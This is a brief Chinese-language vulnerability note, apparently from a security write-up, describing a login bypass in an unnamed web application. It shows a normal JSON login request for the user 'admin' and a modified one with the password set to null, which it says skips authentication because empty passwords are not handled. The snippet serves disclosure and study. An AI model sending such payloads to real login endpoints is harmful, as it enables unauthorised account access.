逻辑缺陷在于，在用户密码password为空时，没有对应的控制逻辑，导致登录绕过。  
  
正常请求的json为：  
  
{"type":2,"username":"admin","password":"admin","captcha":"xcj9","oath":"","remember":false}  
  
那么将password变为null，即可绕过：  
  
{"type":2,"username":"admin","password":null,"captcha":"xcj9","oath":"","remember":false}
